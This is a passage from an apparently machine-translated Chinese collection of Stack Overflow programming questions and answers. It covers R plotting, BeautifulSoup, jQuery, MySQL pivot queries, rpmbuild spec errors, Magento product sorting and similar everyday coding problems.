
        question = (TextView) findViewById(R.id.tvPitanjeCigle);
        b1 = (Button) findViewById(R.id.bOdgCigle1);
        b2 = (Button) findViewById(R.id.bOdgCigle2);
        b3 = (Button) findViewById(R.id.bOdgCigle3);
        b4 = (Button) findViewById(R.id.bOdgCigle4);

        b1.setTypeface(dugmad);
        b2.setTypeface(dugmad);
        b3.setTypeface(dugmad);
        b4.setTypeface(dugmad);
        question.setTypeface(naslov);

    }

} 
```

# r - 为什么多边形函数的差距很小？

> ID：15879947
> 
> 赞同：3
> 
> 时间：2013-04-08T13:10:32.413
> 
> 标签：r, polygon

运行代码后，图表中有一个微小的差距。

```
x = seq(0, 1, by=0.01)
y1=x
y2=x^2
plot(x, y1,type="l")
lines(x,y2,type="l",col="red")
xx1<-c(0,x[x<1  & x>0 ],1,x[x<1  & x>0 ],0)
yy1<-c(0,x[x<1  & x>0 ],1,(x[x<1  & x>0 ])^2,0)
polygon(xx1,yy1,col="yellow") 
```

请看附件，为什么有一个细小的间隙？如何删除它，让它用黄色填充？ ![在此处输入图像描述](https://i.stack.imgur.com/GUnl2.jpg)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T13:25:16.253

如果减少点数，则更容易看出问题的原因：

```
x <- seq(0, 1, by=0.2)
plot(  x, x,   type="l" )
lines( x, x^2, col="red" )
xx1 <- c(0,x[x<1  & x>0 ],1,x[x<1  & x>0 ],0)
yy1 <- c(0,x[x<1  & x>0 ],1,x[x<1  & x>0 ]^2,0)
polygon(xx1, yy1, lwd=3, col="wheat")
points(xx1, yy1) 
```

![在此处输入图像描述](https://i.stack.imgur.com/zEe6k.png)

点是正确的，但顺序不正确。对于凸多边形，`xx1`应该是先增后减。

```
plot(  x, x,   type="l" )
lines( x, x^2, col="red" )
xx1 <- c(x, rev(x))
yy1 <- c(x, rev(x)^2)
polygon(xx1, yy1, lwd=3, col="wheat") 
```

# python-2.7 - BeautifulSoup，“ResultSet”对象没有属性“find_all”

> ID：15879948
> 
> 赞同：2
> 
> 时间：2013-04-08T13:10:33.083
> 
> 标签：python-2.7, beautifulsoup, findall

我阅读了与我的问题相关的其他线程，但它没有解决问题。

```
<h2 class="tabellen_ueberschrift al">Cards</h2>
<div class="fl" style="width:49%;">     
<table class="tabelle_grafik lh" cellpadding="2" cellspacing="1">
        <tr>
            <th class="al" colspan="3">CA Osasuna</th>              
        </tr>

            <td class="s10 al">
                <a href="/en/sisi/profil/spieler_51713.html" class="fb s10" title="Sisi">Sisi</a>
                <br />
                26\.  min. 2\. yellow card, Time wasting              </td>
        </tr> 
```

我想在`a`表中获取所有标签（会有几个），所以我的代码是这样的：

```
header = soup.find('h2', text="Cards")
cards_table = header.find_next_siblings(limit=2)
for row in cards_table.find_all('a'):
    print row 
```

这提高了我

```
AttributeError: 'ResultSet' object has no attribute 'find_all' 
```

`cards_table`是一个表，我用循环对其进行迭代，`for`所以不确定为什么会导致错误。请问有什么想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T13:30:58.170

好的，代码少了一行：

```
for line in cards_table:
    for row in line.find_all('a'):
        print row 
```

`cards_table`是一个列表，因此我们必须先对其进行迭代，然后才能使用`find_all`该表的方法。

# objective-c - NSString 和其他对象类型有什么不同？

> ID：15879952
> 
> 赞同：-3
> 
> 时间：2013-04-08T13:10:46.393
> 
> 标签：objective-c, nsstring

```
NSObject * obj1 = [[NSObject alloc] init];
NSLog(@"%d", [obj1 retainCount]);

NSString * string1 = [[NSString alloc] init];
NSLog(@"%d", [string1 retainCount]); 
```

你能猜出结果吗？哦，我的上帝，它是“1 -1”！那奇怪！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:14:26.870

首先...[什么时候应该使用保留计数？](http://whentouseretaincount.com)

# 从不使用`retainCount`

第二...

不，这并不奇怪，因为您正在查看一个永远不会被释放的字符串文字。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-08T13:28:07.930

这里重要的一点是，您分配和初始化该表单的任何字符串都将返回相同的对象。这与创建 NSNull 相同。空字符串是一个常量，并且始终是同一个对象。

尝试这个：

```
NSString * string1 = [[NSString alloc] init] ;
NSLog(@"%d %u", [string1 retainCount], string1);

NSString * string2 = [[NSString alloc] init];
NSLog(@"%d %u", [string2 retainCount], string2);

NSNull * theNULL = [NSNull null];
NSLog(@"%d %u", [theNULL retainCount], theNULL);

NSNull * theNULL2 = [[NSNull alloc] init];
NSLog(@"%d %u", [theNULL2 retainCount], theNULL2); 
```

string1 和 string2 是相同的值，所以都指向空字符串。两个 NSNull 相同。

这种行为解释了为什么每个 init 方法都以 self=[super init] 开头，因为在 null 字符串或 NULL 对象等情况下，init 可以更改 self。

# jquery - 未捕获的无法读取 null 的顶部

> ID：15879953
> 
> 赞同：0
> 
> 时间：2013-04-08T13:10:46.587
> 
> 标签：jquery

我有一些这样的链接：

```
 <ul class="vertlist">
    <li><a href="#personal" title="Go to Personal section." class="crumblink">Personal</a></li>
    <li><a href="#business" title="Go to Business section." class="crumblink">Business</a></li>
    <li><a href="#company" title="Go to Company section." class="crumblink">Company</a></li>
    <li><a href="#engineering" title="Go to Engineering section." class="crumblink">Engineering</a></li>
    <li><a href="#it" title="Go to IT section." class="crumblink">IT</a></li>
    <li><a href="#hr" title="Go to HR section." class="crumblink">HR</a></li>
  </ul> 
```

还有一些应该允许一些平滑导航的jquery：

```
 $(document).ready(function () {
            $('.crumblink').click(function () {
                $('html, body').animate({
                    scrollTop: $($.attr(this, 'href')).offset().top
                }, 500);
                return false;
            });
        }) 
```

在我单击任何链接的那一刻，我得到一个未捕获的异常：

“无法读取 null 的属性顶部”

例如个人的锚标签是这样的：

`<h2><a name="personal" id="myPersonal">Personal</a></h2>`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:12:20.470

锚变量不包含您站点的有效选择器。对此调用 offset 将返回**null**。

您正在尝试访问不存在的 href。

[看这里](https://stackoverflow.com/questions/7933582/javascript-cannot-read-property-top-of-null)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:15:00.230

如果您尝试`href`从锚点获取属性，那么您做的不对（或者我可能还没有发现 jQuery 的奥秘）：

```
scrollTop: $($.attr(this, 'href')).offset().top 
```

它应该是：

```
scrollTop: $(this.href).offset().top 
```

如果 for 的值`href`是无效的选择器，`offset()`则可能会返回`null`。此代码将防止：

```
var elements = $(this.href);

if (elements && elements.length) {
    $('html, body').animate({
        scrollTop: elements.offset().top
    }, 500);
} 
```

# jquery - ie7 .parents .find 的 jQuery 问题

> ID：15879956
> 
> 赞同：0
> 
> 时间：2013-04-08T13:11:00.787
> 
> 标签：jquery, internet-explorer-7

除了在 ie7 和 8 中，此代码工作正常

```
$(document).ready(function(){
    $('#buchen li').load('buchen.html');
    $(".nav-three").click(function(){
        var reisename = $(this).parents(".kurzreise").find("h3").text();

 <!--Up until here everything seems fine. The var "reisename" contains the text it should.-->

        $(this).parents(".kurzreise").find("#reiseziel").text(reisename);
        $(this).parents(".kurzreise").find("#reiseziel").val(reisename);
    });
}); 
```

尝试在 div "#reiseziel" 中写入文本时，ie7 中没有任何反应。我认为这可能与我通过查询将“buchen.html”加载到另一个html页面的事实有关。或者 .parents 或 .find 是否存在已知问题？

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:16:58.937

也许您可以将其更改为使用 ajax 函数并成功处理您的动态内容？

```
$.ajax({
    url: 'buchen.html',
    success: function(data) {
        $('#buchen li').append(data);
        // Maybe put your stuff here.

        $(this).parents(".kurzreise").find("#reiseziel").text(reisename);
        $(this).parents(".kurzreise").find("#reiseziel").val(reisename);
    }
}); 
```

# python - Python 从 JSON 中提取值

> ID：15879960
> 
> 赞同：1
> 
> 时间：2013-04-08T13:11:03.823
> 
> 标签：python, json

我正在寻找从 JSON 中提取值集并将它们写入文件。

JSON的格式如下：

```
 "interactions":     [
    {
        "type": "free",
        "input":             [
            [ 1, 4594, 119218, 0, [71, 46], [2295, 1492], [71, 46], [2295, 1492], 16017, 520790446, [71, 46, 71, 46], [71, 46, 71, 46] ],
            [ 1, 4594, 119219, 0, [72, 46], [2323, 1492], [72, 46], [2323, 1492], 26016, 520790456, [72, 46, 72, 46], [72, 46, 72, 46] ],
            [ 1, 4594, 119220, 0, [72, 45], [2323, 1464], [72, 45], [2323, 1464], 26016, 520790466, [72, 45, 72, 45], [72, 45, 72, 45] ],
            [ 1, 4594, 119221, 0, [72, 45], [2323, 1464], [72, 45], [2323, 1464], 26016, 520790476, [72, 45, 72, 45], [72, 45, 72, 45] ],
            [ 1, 4594, 119222, 0, [73, 45], [2350, 1464], [73, 45], [2350, 1464], 26016, 520790486, [73, 45, 73, 45], [73, 45, 73, 45] ],
            [ 1, 4594, 119223, 0, [73, 45], [2350, 1464], [73, 45], [2350, 1464], 26016, 520790496, [73, 45, 73, 45], [73, 45, 73, 45] ],
            [ 1, 4594, 119224, 0, [73, 45], [2350, 1464], [73, 45], [2350, 1464], 46000, 520790506, [73, 45, 73, 45], [73, 45, 73, 45] ]
        ] 
```

我需要提取的是 [71, 46] 列，然后是以 520790446 开头的列，并将其写入输出文件。

下面是我现在得到的代码：

```
import json

json_data = open("test_json.json")

data = json.load(json_data)

json_data.close()

# Need some sort of nested loop here to iterate through each line of the block, and each block also.
print data["interactions"][0]["input"][0][4], '\t', data["interactions"][0]["input"][0][9] 
```

其中有几个可变长度的块，我需要提取所有值直到文件末尾。不过，我被困在循环结构中。

任何人都可以提供帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:14:41.053

您可以像这样获取数据：

```
[x[4] for x in data["interactions"][0]["input"]]

[x[9] for x in data["interactions"][0]["input"]] 
```

或者一口气，像

```
[[x[4], x[9]] for x in data["interactions"][0]["input"]] 
```

要回答评论的第一部分：

```
[[x[4], x[9]] for x in interaction["input"] for interaction in data["interactions"]] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:21:48.147

```
def gen_vals(data):
    for i in xrange(len(data["interactions"])):
        for j in data["interactions"][i]["input"]:
            yield (j[4], j[9]) 
```

这是一个可以这样使用的生成器：

```
vals = [x for x in gen_vals(data)] 
```

# php - 如何在PHP中逐年计算一列中的项目数

> ID：15879963
> 
> 赞同：-1
> 
> 时间：2013-04-08T13:11:17.870
> 
> 标签：php, mysql

这可能吗？我有下表

```
ID   CAR  MODEL  YEAR   FUELTYPE
1    Volvo S80   2007        GAS
2    Volvo S80D  2007        DIESEL
3    Volvo S80E  2009        LPN 
```

我想做的是按年份计算不同的燃料类型，输出会是这样的，这是我想使用的谷歌图表的格式。

```
Year GAS DIESEL LPN
2007  1     1    0
2009  0     0    1 
```

我怎样才能用 MySQL 做到这一点？我可以做这样的事情吗？

```
SELECT YEAR, COUNT(FUELTYPE) AS GAS, COUNT (FUELTYPE) AS DIESEL, COUNT (FUELTYPE) AS LPN
FROM  CARDATA
GROUP BY FUELTYPE
ORDER BY YEAR 
```

我知道这是不对的，因为我在每个 FUELTYPE 中得到相同的计数值 - 将其从 mysql 中拉出然后使用 php 进行排序/计数会更好吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:13:19.850

您可以使用带有`CASE`表达式的*聚合*函数将行数据转换为列：

```
select year,
  sum(case when fueltype = 'gas' then 1 else 0 end) gas,
  sum(case when fueltype = 'diesel' then 1 else 0 end) diesel,
  sum(case when fueltype = 'lpn' then 1 else 0 end) lpn
from yt
group by year 
```

请参阅[SQL Fiddle with Demo](http://www.sqlfiddle.com/#!2/99c4d/1)。

如果您有未知数量的`FuelType`值，那么您可以使用准备好的语句来生成动态 SQL：

```
SET @sql = NULL;
SELECT
  GROUP_CONCAT(DISTINCT
    CONCAT(
      'sum(CASE WHEN fueltype = ''',
      fueltype,
      ''' THEN 1 else 0 END) AS `',
      fueltype, '`'
    )
  ) INTO @sql
FROM yt;

SET @sql 
  = CONCAT('SELECT year, ', @sql, ' 
            from yt
            group by year');

PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt; 
```

请参阅[SQL Fiddle with Demo](http://www.sqlfiddle.com/#!2/99c4d/4)。这两个结果：

```
| YEAR | GAS | DIESEL | LPN |
-----------------------------
| 2007 |   1 |      1 |   0 |
| 2009 |   0 |      0 |   1 | 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:13:50.490

如果只有三个`FuelType`，最简单的解决方案`MySQL`是使用`GROUP BY`, 和`SUM()`。

```
SELECT  Year,
        SUM(FUELTYPE = 'GAS') GAS,
        SUM(FUELTYPE = 'DIESEL') DIESEL,
        SUM(FUELTYPE = 'LPN') LPN
FROM    CARDATA
GROUP   BY YEAR 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/a1e0c/3)

但如果您有未知数量的`FUELTYPE`，则更喜欢动态 sql。

```
SET @sql = NULL;

SELECT  GROUP_CONCAT(DISTINCT
        CONCAT('SUM(FUELTYPE = ''',
               FUELTYPE, ''') AS ',
               CONCAT('`', FUELTYPE, '`')
               )) INTO @sql
FROM CARDATA;

SET @sql = CONCAT('SELECT   Year, ', @sql, ' 
                   FROM CARDATA
                   GROUP BY YEAR');

PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt; 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/a1e0c/2)

输出

```
╔══════╦═════╦════════╦═════╗
║ YEAR ║ GAS ║ DIESEL ║ LPN ║
╠══════╬═════╬════════╬═════╣
║ 2007 ║   1 ║      1 ║   0 ║
║ 2009 ║   0 ║      0 ║   1 ║
╚══════╩═════╩════════╩═════╝ 
```

# windows-8 - Treeview 控件（comctl32 / VB5 时代）缺少图标和标题？

> ID：15879964
> 
> 赞同：2
> 
> 时间：2013-04-08T13:11:18.230
> 
> 标签：windows-8, vb6, treeview

VB6 应用程序在 Windows 8 上运行良好，但有一个例外：

用树视图显示表单。正确显示。单击显示另一个用于输入的表单的按钮。当新表单被解除（并将新节点添加到树视图中）时，所有节点的图片都是不可见的。+/- 符号显示，但不显示图片和标题。

如果表单关闭然后重新打开，则所有节点都会正确显示，直到打开另一个表单。

所涉及的两个窗体都是 MDI 子窗体。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-05-16T15:54:32.253

我刚刚在客户端机器上遇到了这个问题。不幸的是，我没有使用 VB6 (mscomctl.ocx) 控件进行重建的奢侈，根据前面的评论应该可以工作。

然而事实证明，如果您在 Windows 8 中禁用“触摸屏键盘和手写面板”服务，comctl32.ocx TreeView 控件将正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-04-22T11:43:28.330

IIRC 从以前的经验来看，虽然 COMCTL32（来自 VB5）中的树视图存在这个问题，但更新程序以使用 VB6 时代的 MSCOMCTL32 树视图应该可以解决它。假设您无法禁用触摸服务，我认为我们没有找到任何其他解决根本问题的方法。

我相信这两个树视图非常相似，这次升级应该不难。

我不记得是否有任何其他常见控件有同样的问题。

# c# - VS2012 自动化部署 - 没有为项目设置 OutputPath 属性

> ID：15879965
> 
> 赞同：2
> 
> 时间：2013-04-08T13:11:18.807
> 
> 标签：c#, visual-studio-2012, build-definition

好吧，我知道这已经被问过很多次了......

我试图更改配置和输出路径，但我仍然有这个问题。

我正在为我们的产品设置自动构建和部署。我们有一个解决方案文件和其中的多个项目。

使用 VS2012 和默认构建定义，我已将“要构建的项目”设置为单个项目 - 我们希望为其构建和部署的项目。

让我们将此项目称为“表单”。

当我运行构建定义时，它会构建并表示成功。但是，它发出警告：

> $/XXX/TRUNK/XXX/Forms.Web/Forms.Web.csproj - 0 个错误，1 个警告，查看日志文件 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft。 Common.targets (610)：未为项目“Forms.Web.csproj”设置 OutputPath 属性。请检查以确保您为此项目指定了有效的配置和平台组合。配置='发布'平台='任何 CPU'。您可能会看到此消息，因为您正在尝试构建没有解决方案文件的项目，并且指定了该项目不存在的非默认配置或平台。

我检查了 .csproj 文件，并且有一个指定了 OutputPath 的属性组。

我也尝试了配置/平台的各种组合，但问题仍然存在。

有谁知道可能导致这种情况的原因？它快把我逼疯了。如果没有这个修复，就不会进行部署......它似乎只构建并且甚至不生成 .DLL 文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-04T13:31:09.957

尝试**删除“平台”环境变量。**

（Visual Studio 使用这个环境变量，这可能是错误的。）

然后重新启动VS，并重新构建解决方案......

# c# - Windows 8 商店 - 从商店下载的调试应用程序

> ID：15879966
> 
> 赞同：6
> 
> 时间：2013-04-08T13:11:23.530
> 
> 标签：c#, .net, windows-8, microsoft-metro, windows-store-apps

有没有办法调试从商店下载的 Windows 应用商店应用程序？我有我上传的构建的源代码，但没有断点工作。

我问的原因是应用内购买在实时商店中不起作用，但它们在测试模式下运行良好。我需要看到被抛出的异常——它被应用程序捕获并打印到`Debug.WriteLine`，但我在控制台中也看不到它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:18:06.257

好的，如果您按照以下步骤操作，它会起作用：

```
Debug->Debug Installed App Package 
```

确保“调试此代码类型：”显示“混合（托管和本机）”

一旦我选中了那个框，它就可以正常工作，但是调试当然很慢。

PS - 您还必须在上传到商店的原始版本中包含符号文件。这是始终这样做的一个很好的理由。

# inversion-of-control - 带有 ValidationAttribute 的 Autofac 属性注入

> ID：15879967
> 
> 赞同：3
> 
> 时间：2013-04-08T13:11:32.340
> 
> 标签：inversion-of-control, autofac

我有一个看起来像这样的 ValidationAttribute：

```
public class RegistrationUniqueNameAttribute : ValidationAttribute
{
    public IRepository<User> UserRepository { get; set; }

    public override bool IsValid(object value)
    {
       //use UserRepository here....
    }
} 
```

在我的容器设置中（在应用程序启动中）我有这个：

```
 builder.Register(c => new RegistrationUniqueEmailAttribute
            {
                UserRepository = c.Resolve<IRepository<User>>()
            }); 
```

但是，在调试时，UserRepository 的值始终为 null，因此不会注入该属性。

我的容器设置错误了吗？

我真的宁愿不必使用`DependencyResolver.Current.GetService<IRepository<User>>()`，因为这不是可测试的......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-02-04T18:46:59.220

不，Autofac v3 对`ValidationAttribute`和朋友没有做任何特别的事情[`Autofac.Mvc`做了很多强大的事情，例如，过滤器属性]。

[我在这个答案](https://stackoverflow.com/a/35214460/11635)中间接解决了这个问题，使一个人可以写：

```
class MyModel 
{
    ...
    [Required, StringLength(42)]
    [ValidatorService(typeof(MyDiDependentValidator), ErrorMessage = "It's simply unacceptable")]
    public string MyProperty { get; set; }
    ....
}

public class MyDiDependentValidator : Validator<MyModel>
{
    readonly IUnitOfWork _iLoveWrappingStuff;

    public MyDiDependentValidator(IUnitOfWork iLoveWrappingStuff)
    {
        _iLoveWrappingStuff = iLoveWrappingStuff;
    }

    protected override bool IsValid(MyModel instance, object value)
    {
        var attempted = (string)value;
        return _iLoveWrappingStuff.SaysCanHazCheez(instance, attempted);
    }
} 
```

（还有一些辅助类包括连接到 ASP.NET MVC ......）

# linux - 临时文件中的 rpmbuild 错误

> ID：15879973
> 
> 赞同：1
> 
> 时间：2013-04-08T13:11:38.333
> 
> 标签：linux, centos, redhat, rpm, rpmbuild

我对 RPM 和 RPM 构建完全陌生。

这是我得到的错误：

```
[impulse@localhost SPECS]$ rpmbuild -bp pa_connector.spec
Executing(%prep): /bin/sh -e /var/tmp/rpm-tmp.71097
+ umask 022
+ cd /usr/src/redhat/BUILD
+ LANG=C
+ export LANG
+ unset DISPLAY
+ $'\r'
: command not found097: line 27:
error: Bad exit status from /var/tmp/rpm-tmp.71097 (%prep)

RPM build errors:
    Bad exit status from /var/tmp/rpm-tmp.71097 (%prep) 
```

我不确定该临时文件是如何或何时创建的或其用途。如果有人也可以为我澄清这一点，我将不胜感激！

这是我的规格文件：

```
Summary:  PA_Connector
Name:   PA_Connector
Provides:   PA_Connector
Version:    1.0
Release: 1.0
License: GPLv2+ and LGPLv2+
Group: System Environment/Daemons
URL: http://www.impulse.com/

Source: pa_connector.tar.gz

%define initddir %{?_initddir:%{_initddir}}%{!?_initddir:%{_initrddir}}
%define scriptdir ./script\\\ src
%define installdir $RPM_BUILD_ROOT/opt/pa_connector
%define libdir %{installdir}/lib
%define builddir %{installdir}/build
%define configdir config

#BuildRoot: %{_tmppath}/%{name}-%{version}-%{release}-root-%(%{__id_u} -n)

#BuildRequires:  ant

%description
Testing PA building   

%prep
%setup -q -n PA_Connector -c PA_Connector pa_connector

%build
# Right now no build is really taking place, the build.xml file is executed first.
/usr/bin/ant -Djava.io.tmpdir=/tmp/PA_CONNECTOR-CORE-JOB1 -f build.xml jar

%install
rm -rf $RPM_BUILD_ROOT
mkdir -p %{installdir}
install -D -m 755 %{scriptdir}/pa_connector $RPM_BUILD_ROOT/%{initddir}/pa_connector
install -D -m 755 %{scriptdir}/pa_connector.sh %{installdir}/pa_connector.sh
install -D -m 644 %{configdir}/config.xml %{installdir}/config.xml
install -D -m 644 %{configdir}/log4j.properties %{installdir}/log4j.properties
install -D -d lib   %{libdir}
install -D -m 644 pa_connector.jar %{libdir}/pa_connector.jar
install -D -m 644 lib/commons-logging-1.1.1.jar %{libdir}/commons-logging-1.1.1.jar
install -D -m 644 lib/log4j-1.2.17.jar %{libdir}/log4j-1.2.17.jar

%clean
rm -rf $RPM_BUILD_ROOT

# Make sure our user/group is present prior to any package or subpackage installation
%pre
if [ $1 -eq 1 ];then #Install
    getent group  impulse >/dev/null || /usr/sbin/groupadd -r -g 500 impulse > /dev/null 2>&1
    getent passwd impulse >/dev/null || /usr/sbin/useradd  -r -g impulse -u 500 -c "impulse user" -s /sbin/nologin impulse > /dev/null 2>&1
elif [ $1 -eq 2 ];then  #Upgrade
    # Stop the service before upgrading
    /sbin/service pa_connector stop &> /dev/null
fi
exit 0

%files
%defattr(-,root,root)
%{initddir}/pa_connector
%dir %attr(755,impulse,impulse) /opt/pa_connector
attr(755,impulse,impulse) /opt/pa_connector/pa_connector.sh
%dir %attr(755,impulse,impulse) /opt/pa_connector/lib
attr(644,impulse,impulse) /opt/pa_connector/lib/pa_connector.jar
attr(644,impulse,impulse) /opt/pa_connector/lib/commons-logging-1.1.1.jar
attr(644,impulse,impulse) /opt/pa_connector/lib/log4j-1.2.17.jar
attr(644,impulse,impulse) /opt/pa_connector/log4j.properties
attr(644,impulse,impulse) /opt/pa_connector/config.xml 
```

tarball 包含以下内容：

```
[impulse@localhost SPECS]$ tar -tvf ../SOURCES/pa_connector.tar.gz
drwxr-xr-x root/root         0 2013-04-05 16:24:52 pa_connector/
drwxr-xr-x root/root         0 2013-03-29 14:22:33 pa_connector/lib/
-rwxr-xr-x root/root    489883 2013-03-29 14:22:33 pa_connector/lib/log4j-1.2.17.jar
-rwxr-xr-x root/root     60841 2013-03-29 14:22:33 pa_connector/lib/commons-logging-1.1.1.jar
drwxr-xr-x root/root         0 2013-03-29 14:22:33 pa_connector/src/
drwxr-xr-x root/root         0 2013-03-29 14:22:33 pa_connector/src/com/
drwxr-xr-x root/root         0 2013-03-29 14:22:33 pa_connector/src/com/impulse/
drwxr-xr-x root/root         0 2013-03-29 14:22:33 pa_connector/src/com/impulse/connector/
drwxr-xr-x root/root         0 2013-03-29 14:22:34 pa_connector/src/com/impulse/connector/paloalto/
-rw-r--r-- root/root      2389 2013-03-29 14:22:34 pa_connector/src/com/impulse/connector/paloalto/AuthDeltaBroker.java
... etc 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T17:06:25.797

我能够修复它。这个错误不断出现的原因是因为我最初在 Windows 文本编辑器上创建了我的规范文件，该编辑器插入了这些回车符。我在 CentOS 机器上重新制作了文件，现在可以正常工作了。希望对遇到此问题的其他人有所帮助！

# magento - Magento : 缺货产品在类别页面中显示在最后

> ID：15879978
> 
> 赞同：2
> 
> 时间：2013-04-08T13:11:44.213
> 
> 标签：magento, magento-1.7

我正在使用 Magento 1.7.0.2，并且我在 /app/code/core/Mage/Catalog/Block/Product/list.php 中使用了以下代码行：

```
$this->_productCollection = $layer->getProductCollection()
                    ->joinField(
                        'inventory_in_stock', 
                        'cataloginventory_stock_item', 
                        'is_in_stock', 
                        'product_id=entity_id',
                        'is_in_stock>=0', 
                        'left')
                    ->setOrder('inventory_in_stock','desc'); 
```

排序位置和名称时，缺货产品排在最后。但是在按价格排序时，缺货的产品不是最后的正常顺序。

我怎样才能使缺货产品即使在价格之后的排序中也能保持最后？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-06-16T08:39:40.440

伟大的发现亚历克斯！提示：如果您想避免更改核心文件（并可能将其放入模块中），您可以将其添加到事件侦听器中，如下所示（在 1.8.1.0 上测试）：

```
/**
 * Fires before a product collection is loaded
 *
 * @param Varien_Event_Observer $observer
 */
public function catalog_product_collection_load_before($observer)
{
    $collection = $observer->getCollection();
    $collection->getSelect()->joinLeft(
        array('_inventory_table'=>$collection->getTable('cataloginventory/stock_item')),
        "_inventory_table.product_id = e.entity_id",
        array('is_in_stock', 'manage_stock')
    );
    $collection->addExpressionAttributeToSelect(
        'on_top',
        '(CASE WHEN (((_inventory_table.use_config_manage_stock = 1) AND (_inventory_table.is_in_stock = 1)) OR  ((_inventory_table.use_config_manage_stock = 0) AND (1 - _inventory_table.manage_stock + _inventory_table.is_in_stock >= 1))) THEN 1 ELSE 0 END)',
        array()
    );
    $collection->getSelect()->order('on_top DESC');
    // Make sure on_top is the first order directive
    $order = $collection->getSelect()->getPart('order');
    array_unshift($order, array_pop($order));
    $collection->getSelect()->setPart('order', $order);
} 
```

编辑：从*catalog_product_collection_apply_limitations_before*改回*catalog_product_collection_load_before*并固定订单零件优先级。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T18:45:55.927

我建议您运行两个集合 1\. 按价格排序的库存产品集合。->addAttributeToFilter('is_in_stock', 数组('gt' => 0)); 收藏参考链接：http: [//www.magentocommerce.com/knowledge-base/entry/magento-for-dev-part-8-varien-data-collections](http://www.magentocommerce.com/knowledge-base/entry/magento-for-dev-part-8-varien-data-collections)

2.  缺货产品的集合按价格排序。

请参阅此链接： [Magento 列出所有缺货商品](https://stackoverflow.com/questions/10186245/magento-list-all-out-of-stock-items)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T10:55:29.630

我找到了答案

您必须添加此代码：

```
$this->getSelect()->joinLeft(
            array('_inventory_table'=>$this->getTable('cataloginventory/stock_item')),
            "_inventory_table.product_id = e.entity_id",
            array('is_in_stock', 'manage_stock')
        );
        $this->addExpressionAttributeToSelect('on_top',
        '(CASE WHEN (((_inventory_table.use_config_manage_stock = 1) AND (_inventory_table.is_in_stock = 1)) OR  ((_inventory_table.use_config_manage_stock = 0) AND (1 - _inventory_table.manage_stock + _inventory_table.is_in_stock >= 1))) THEN 1 ELSE 0 END)',
         array());
        $this->getSelect()->order('on_top DESC'); 
```

就在之前

```
if ($attribute == 'price' && $storeId != 0) { 
```

在 app/code/core/Mage/Catalog/Model/Resource/Eav/Mysql4/Product/Collection.php

或者在 app/code/core/Mage/Catalog/Model/Resource/Product/Collection.php 如果你有 Magento 1.7.0.0 +*

# ios - hpple xpath 问题

> ID：15879979
> 
> 赞同：1
> 
> 时间：2013-04-08T13:11:46.153
> 
> 标签：ios, xpath, hpple

我正在使用 hpple 解析 HTML 文档。我遵循了 Ray Wenderlich 的教程，并让他们的示例文件一切正常。但是，我需要对其进行一些更改，以便为我的朋友博客读取某个 HTML 文件。该文件比我迄今为止使用的示例更复杂。文件的相关部分（完整上传的[要点](https://gist.github.com/anonymous/5337252)是：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
<!-- snip -->
<div id="content" class="hfeed">
            <div class="post-21443 post type-post status-publish format-standard hentry category-about-catherine">

      <div class="postdate">
      Apr          <br />
      6            <br />
      2013         
      </div>
    <h2 class="entry-title"><a href="http://catherinepooler.com/2013/04/stampnation-live-retreat-updates/" title="StampNation LIVE Retreat Updates" rel="bookmark">StampNation LIVE Retreat Updates</a></h2>

    <div class="post-info"></div>       <div class="entry-content">
        <p><a href="http://catherinepooler.com/wp-content/uploads/2013/04/IMG_0560.jpg" ><img class="aligncenter size-large wp-image-21444" alt="StampNation LIVE" src="http://catherinepooler.com/wp-content/uploads/2013/04/IMG_0560-450x337.jpg" width="450" height="337" /></a></p> <p>StampNation LIVE is in full swing!  We are having a wonderful time.  I am taking a quick break from stamping and chatting to share a few photos with you.</p> <p>I think my favorite thing in getting ready for the retreat was setting up the Accessory Bar.  Each attendee received a small galvanized bucket with their fully glittered initial on it to fill up at the bar.  Awesome!</p>
<!-- snip --> 
```

文件中有几个这样的部分，我需要将所有

```
<h2 class = "entry-title"> 
```

(title="StampNation LIVE 撤退更新") 在一个数组中。我已成功放置

```
<div class = "entry-content"> 
```

使用 XPathQuery 放入一个数组中`//div[@class = 'entry-content']/p`。但是，如果没有由于空数组而导致代码崩溃，我似乎无法获得标题。显然我的 XPathQuery 不正确。这是我尝试过的。

```
//h2[@class = 'entry-title']  (: this crashed :)

//div[@class = 'post-21443.....']//h2[@class = 'entry-title']  (: this crashed too.   ") 
```

以及一系列其他尝试！

有人对我有什么建议吗？我查看了许多 SO 答案，以及 hpple 附带的示例，但我无法将它们拼凑在一起。

更新：在 Jens 的帮助下，我将查询更改为
NSString *postsXpathQueryString = @"//h2[@class = 'entry-title']/a";

这给了我一个数组，但我现在也得到了这个错误。

